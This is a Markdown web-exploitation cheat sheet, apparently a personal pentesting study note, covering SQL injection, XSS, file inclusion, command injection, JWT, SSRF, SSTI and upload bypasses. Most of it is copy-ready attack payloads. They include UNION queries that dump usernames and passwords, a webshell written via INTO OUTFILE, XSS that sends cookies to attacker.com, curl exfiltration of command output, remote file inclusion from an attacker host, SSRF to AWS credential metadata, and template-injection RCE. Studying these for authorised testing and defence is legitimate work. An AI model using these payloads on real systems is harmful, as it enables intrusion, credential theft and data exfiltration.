# 🕸️ Web Hacking & Exploitation

> **Focus:** Exploiting web application vulnerabilities. This is the largest attack surface in modern pentesting.

---

## 📋 Web Pentest Methodology

```
1. Recon & Mapping
   ├── Technology identification (Wappalyzer, whatweb)
   ├── Directory/file discovery (ffuf, gobuster)
   ├── Parameter discovery (Arjun, ParamSpider)
   └── Sitemap, robots.txt, .git, .env

2. Authentication Testing
   ├── Default credentials
   ├── Brute-force (Hydra, Burp Intruder)
   ├── Registration flaws
   └── Password reset flaws

3. Authorization Testing
   ├── IDOR (change IDs in requests)
   ├── Privilege escalation (user → admin)
   ├── Forced browsing (access admin pages directly)
   └── HTTP method tampering

4. Injection Testing
   ├── SQL Injection
   ├── Command Injection
   ├── SSTI (Template Injection)
   ├── XSS (Cross-Site Scripting)
   └── XXE (XML External Entity)

5. File-Based Attacks
   ├── LFI / RFI (File Inclusion)
   ├── File Upload bypass
   └── Path Traversal

6. Logic & Session Attacks
   ├── Session fixation/hijacking
   ├── CSRF
   ├── JWT manipulation
   └── Business logic flaws
```

---

## 🗂️ OWASP Top 10 (2025) — Quick Reference

> Theory from THM Cybersecurity 101 Module 14. Each category links to the relevant technical section below.

| # | Category | Why it happens | Where to exploit |
|---|---|---|---|
| A01 | **Broken Access Control** | App doesn't properly enforce who can do what — horizontal (access other users' data) or vertical (access higher-privilege functions) | See Auth Bypass + IDOR in methodology |
| A02 | **Security Misconfiguration** | Assets deployed with bad config — default creds, open admin panels, verbose error messages, unnecessary services | Default creds, exposed admin pages, directory listing |
| A03 | **Software Supply Chain Failures** | App relies on components, libs or services that are outdated, compromised or improperly verified | CVE lookup on identified versions (Nmap -sV → searchsploit) |
| A04 | **Cryptographic Failures** | Encryption used incorrectly or not at all — sensitive data exposed in transit or at rest | See `INFRA_ADMIN/Cryptography/README.md` |
| A05 | **Injection** | App takes user input and mishandles it — passes it to an interpreter without sanitization | See SQL Injection + Command Injection sections below |
| A06 | **Insecure Design** | Flawed logic or architecture built into the system from the start — not fixable by patching | Business logic flaws, race conditions, workflow bypass |
| A07 | **Authentication Failures** | App can't properly verify or bind a user's identity | See Authentication Bypass section below |
| A08 | **Software/Data Integrity Failures** | App relies on code, updates or data it assumes are safe without verifying authenticity or integrity | Tampered updates, unsigned packages, insecure deserialization |
| A09 | **Logging & Alerting Failures** | App doesn't record or alert on security-relevant events — attackers go undetected | Blue Team concern — see `🔵 BLUE_TEAM/01_SOC_SIEM/README.md` |

---

## 💉 SQL Injection (SQLi)

### Detection
```
' OR 1=1--
" OR 1=1--
' OR 1=1#
') OR ('1'='1
' UNION SELECT NULL--
' AND 1=2--
```

### UNION-Based Exploitation
```sql
-- Find number of columns
' ORDER BY 1--    (increment until error)

-- Identify displayable columns
' UNION SELECT 1,2,3--

-- Extract database names
' UNION SELECT schema_name,NULL,NULL FROM information_schema.schemata--

-- Extract tables
' UNION SELECT table_name,NULL,NULL FROM information_schema.tables WHERE table_schema='dbname'--

-- Extract columns
' UNION SELECT column_name,NULL,NULL FROM information_schema.columns WHERE table_name='users'--

-- Extract data
' UNION SELECT username,password,NULL FROM users--

-- Read files (MySQL)
' UNION SELECT LOAD_FILE('/etc/passwd'),NULL,NULL--

-- Write files (MySQL)
' UNION SELECT "webshell content",NULL,NULL INTO OUTFILE '/var/www/html/shell.php'--
```

### Blind SQLi (Boolean)
```sql
-- Test true/false
' AND 1=1--    (normal response)
' AND 1=2--    (different response)

-- Extract data char by char
' AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a'--
' AND (SELECT LENGTH(password) FROM users LIMIT 1)>10--
```

### Blind SQLi (Time-Based)
```sql
-- MySQL
' AND SLEEP(5)--
' AND IF(SUBSTRING(database(),1,1)='a',SLEEP(5),0)--

-- MSSQL
'; WAITFOR DELAY '0:0:5'--

-- PostgreSQL
'; SELECT pg_sleep(5)--
```

### SQLMap Cheat Sheet
```bash
# Basic GET
sqlmap -u "http://target/page?id=1" --dbs --batch

# POST request from Burp
sqlmap -r request.txt --batch --dbs

# Dump specific table
sqlmap -u "URL" -D dbname -T users --dump

# Get OS shell
sqlmap -u "URL" --os-shell

# Bypass WAF
sqlmap -u "URL" --tamper=space2comment,between --random-agent

# Specify injection point
sqlmap -u "URL" -p "parameter" --technique=BT
```

---

## 🎯 Cross-Site Scripting (XSS)

### Types
| Type | Where it executes | Persistence |
|------|-------------------|-------------|
| Reflected | URL parameter → response | None (one-time) |
| Stored | Saved in DB → shown to users | Persistent |
| DOM-based | Client-side JS manipulation | Depends |

### Test Payloads (start simple, escalate)
```html
<!-- Basic detection -->
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>

<!-- If tags are filtered -->
"><script>alert(1)</script>
'><script>alert(1)</script>
javascript:alert(1)

<!-- If script is filtered -->
<img src=x onerror=alert(1)>
<svg/onload=alert(1)>
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
<marquee onstart=alert(1)>

<!-- If event handlers filtered -->
<script>alert`1`</script>
<script>alert(String.fromCharCode(88,83,83))</script>

<!-- Cookie stealing -->
<script>document.location='http://attacker.com/steal?c='+document.cookie</script>
<img src=x onerror="fetch('http://attacker.com/?c='+document.cookie)">
```

### XSS Filter Bypass
```html
<!-- Case variation -->
<ScRiPt>alert(1)</ScRiPt>

<!-- Encoding -->
<script>eval(atob('YWxlcnQoMSk='))</script>

<!-- Double encoding -->
%253Cscript%253Ealert(1)%253C/script%253E

<!-- Null bytes -->
<scr%00ipt>alert(1)</scr%00ipt>
```

---

## 📂 File Inclusion (LFI / RFI)

### LFI Detection
```
http://target.com/page?file=../../../../etc/passwd
http://target.com/page?file=....//....//....//etc/passwd
http://target.com/page?file=/etc/passwd%00    (null byte, PHP < 5.3)
http://target.com/page?file=php://filter/convert.base64-encode/resource=index.php
```

### LFI Interesting Files
```
# Linux
/etc/passwd
/etc/shadow (if readable)
/etc/hosts
/proc/self/environ
/var/log/apache2/access.log
/var/log/auth.log
~/.ssh/id_rsa
/home/<user>/.bash_history

# Windows
C:\Windows\System32\drivers\etc\hosts
C:\Windows\win.ini
C:\inetpub\wwwroot\web.config
C:\Users\<user>\.ssh\id_rsa
```

### LFI to RCE
```bash
# Log Poisoning (Apache)
# 1. Inject into User-Agent:
curl -A "<?php system(\$_GET['cmd']); ?>" http://target.com/
# 2. Include the log:
http://target.com/page?file=/var/log/apache2/access.log&cmd=whoami

# PHP Wrappers
# Read source code (base64)
php://filter/convert.base64-encode/resource=config.php

# Execute code
php://input   (POST body contains PHP code)
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=

# Expect wrapper
expect://whoami
```

### RFI (Remote File Inclusion)
```
http://target.com/page?file=http://attacker.com/shell.txt
http://target.com/page?file=\\attacker.com\share\shell.php
```

---

## 💻 Command Injection

### Detection
```bash
# Operators to test
; whoami
| whoami
|| whoami
& whoami
&& whoami
$(whoami)
`whoami`
```

### Blind Command Injection
```bash
# Time-based
; sleep 5
| sleep 5

# Out-of-band (DNS)
; nslookup attacker.com
| curl http://attacker.com/$(whoami)
; ping -c 1 attacker.com
```

### Bypass Filters
```bash
# Space bypass
{cat,/etc/passwd}
cat${IFS}/etc/passwd
cat$IFS/etc/passwd
X=$'cat\x20/etc/passwd'&&$X

# Keyword bypass
c'a't /etc/passwd
c"a"t /etc/passwd
/bin/c?t /etc/passwd
cat /e?c/p?sswd

# Newline bypass
%0awhoami
```

---

## 🔐 Authentication Bypass

### Common Techniques
```
# Default credentials (always try first)
admin:admin, admin:password, root:root, test:test

# SQL injection in login
Username: admin' OR 1=1--
Password: anything

# Response manipulation (Burp)
Change "authenticated": false → true
Change HTTP 302 redirect to 200

# Password reset flaws
- Predictable tokens
- Host header injection
- Email parameter pollution

# 2FA Bypass
- Skip the 2FA page (go directly to /dashboard)
- Brute-force short codes
- Reuse valid codes
- Response manipulation
```

---

## 🎫 JWT Attacks

### Structure: Header.Payload.Signature

### Common Attacks
```bash
# None algorithm attack
# Change header to: {"alg":"none","typ":"JWT"}
# Remove signature (keep trailing dot)

# Key confusion (RS256 → HS256)
# Sign with the public key using HS256

# Brute-force weak secret
hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt
john jwt.txt --wordlist=rockyou.txt --format=HMAC-SHA256

# Tools
jwt_tool <token> -T    # Tamper mode
jwt_tool <token> -C -d rockyou.txt   # Crack secret
```

---

## 🌐 SSRF (Server-Side Request Forgery)

### Basic Payloads
```
# Access internal services
http://127.0.0.1:80
http://localhost:8080/admin
http://[::1]:80

# Cloud metadata (AWS)
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Cloud metadata (Azure)
http://169.254.169.254/metadata/instance?api-version=2021-02-01

# Internal network scanning
http://192.168.1.1:22
http://10.0.0.1:3306
```

### Bypass Filters
```
# Decimal IP
http://2130706433  (= 127.0.0.1)

# Hex IP
http://0x7f000001

# Octal
http://0177.0.0.1

# DNS rebinding
http://spoofed.burpcollaborator.net

# URL encoding
http://127.0.0.1%2523@attacker.com

# Redirect bypass
http://attacker.com/redirect?url=http://127.0.0.1
```

---

## 📝 SSTI (Server-Side Template Injection)

### Detection
```
# Test with math expressions
{{7*7}}     → 49 means Jinja2/Twig
${7*7}      → 49 means Freemarker/Velocity
#{7*7}      → 49 means Thymeleaf
<%= 7*7 %>  → 49 means ERB (Ruby)
```

### Exploitation (Jinja2 / Python)
```python
# Read files
{{ ''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read() }}

# RCE
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('whoami').read() }}

# Simpler RCE payloads
{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}
```

### Exploitation (Twig / PHP)
```
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("whoami")}}
```

---

## 📁 File Upload Attacks

### Bypass Techniques
```
# Extension bypass
shell.php → shell.php5, shell.phtml, shell.phar
shell.php → shell.php.jpg (double extension)
shell.php → shell.php%00.jpg (null byte)
shell.php → shell.PHP (case)
shell.php → shell.php. (trailing dot)
shell.php → shell.php::$DATA (Windows ADS)

# Content-Type bypass
Change Content-Type to: image/jpeg, image/png

# Magic bytes bypass
Add GIF header: GIF89a; before PHP code
Add PNG header bytes before code

# .htaccess upload
Upload .htaccess with: AddType application/x-httpd-php .jpg
Then upload shell.jpg with PHP code
```

---

## 🔗 Associated Tools
- [Burp Suite](../../TOOLS/burpsuite.md) - Intercepting proxy
- [SQLMap](../../TOOLS/sqlmap.md) - SQL injection automation
- [Gobuster](../../TOOLS/gobuster.md) - Content discovery
- [Hydra](../../TOOLS/hydra.md) - Login brute-force
